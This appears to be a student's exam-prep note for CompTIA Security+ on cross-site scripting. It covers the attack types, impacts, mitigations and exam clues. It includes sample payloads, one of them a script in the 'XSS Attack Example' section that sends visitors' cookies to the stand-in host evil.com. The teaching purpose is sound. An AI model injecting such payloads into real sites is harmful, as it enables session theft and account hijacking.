# Cross-site Scripting (XSS)
**Cross-Site Scripting (XSS)** is an attack where an attacker injects **malicious JavaScript** into a trusted website so that it executes in **another user’s browser**.
> In plain terms:  
> Attacker makes _your browser_ run _their code_ on a _trusted site_.

This is **client-side execution** — not database tampering like SQLi.

---
### **The Root Cause**
**The web application does not properly validate or sanitize user input before displaying it back to other users.**

Same _root cause_ category as SQLi:
- Trusting user input
- Failing to sanitize
- Failing to encode output

But the _target_ is different → SQL database vs user’s browser.

---
### **Types of XSS (the 3 you MUST know)**

#### **Reflected XSS**
- Payload is **in the request** (URL/form) and immediately reflected in the response.
- No storage — one-time attack.
- Used in phishing-style links.

Example:
```html
https://example.com/search?q=<script>alert('Hacked')</script>
```
**Exam clue:** “Clicking a malicious link causes script to execute.”

#### **Stored XSS (Persistent XSS)**
- Malicious script is **saved** on the server (DB, comments, profile fields).
- Every user who views the page executes the script.

Example:  
Attacker posts:
```html
<script>stealCookies()</script>
```

**Most dangerous form.**
**Exam clue:** “Users visiting a page are repeatedly affected.”

#### **DOM-Based XSS**
- Injection happens entirely in the **browser Document Object Model**, not the server.
- Browser-side JavaScript processes malicious input.

Example:
```Javascript
document.location.hash;
```

Used without sanitization → script injection.
**Exam clue:** “Vulnerability in client-side script” / “DOM manipulation.”

---
### **What XSS Can Do**
Although the impact depends on the site, common actions include:
- **Steal session cookies** → Hijack accounts
- **Perform actions as the user** (CSRF-like behavior)
- **Redirect to malicious sites**
- **Log keystrokes**
- **Fingerprint the browser**
- **Drop malware**

_CIA impact:_  
Major threat to **[[02-The-CIA-Triad#Confidentiality|Confidentiality]]** (stolen sessions), and **[[02-The-CIA-Triad#Integrity|Integrity]]** (tampered pages).

---
### **Why Browsers Allow This**
Because browsers **trust the website you’re on**, and run its JavaScript with the same privileges.

XSS “piggybacks” on that trust.

This ties into the **Same-Origin Policy (SOP)**:
- A malicious site cannot read JavaScript from another domain
- BUT if it injects its own script _into_ the trusted domain → bypass

---
### **Mitigations (CompTIA loves these)**

#### **Escape (encode) output**
Convert `<`, `>` into HTML entities.

#### **Input validation**
Reject untrusted tags, scripts, event handlers.

#### **Content Security Policy (CSP)**
Restrict which scripts the browser can run.

#### **HttpOnly cookies**
Stops JavaScript from reading session cookies.

#### **SameSite cookies**
Prevents cross-site request abuse.

#### **Disable inline JavaScript**
Makes stored/reflected XSS harder.

CompTIA tip:  
“BEST mitigation” → **Output encoding & sanitization**  
“Prevent cookie theft” → **HttpOnly**

---
### **XSS vs [[30-SQL-Injection|SQL Injection]] vs CSRF**

|Attack|What is injected?|Where it runs?|Purpose|
|---|---|---|---|
|**SQLi**|SQL|Database|Steal/modify data|
|**XSS**|JavaScript|User’s browser|Steal cookies / impersonate|
|**CSRF**|Forged request|Server|Trick user into action|

Security+ loves these distinctions.

---
### **XSS Attack Example**

User posts:
```js
<script>document.location='http://evil.com?cookie='+document.cookie</script>
```

Other users load that page → their browsers send session cookies to attacker.

---
### **High-Value Exam Clues**

If a question says:
- “JavaScript executes in the victim’s browser” → **XSS**
- “Malicious code embedded in comments or profiles” → **Stored XSS**
- “Payload is part of a URL parameter” → **Reflected XSS**
- “DOM manipulation vulnerability” → **DOM XSS**
- “Prevented by input validation + output encoding” → **XSS**
- “Attacker steals session cookies” → **XSS**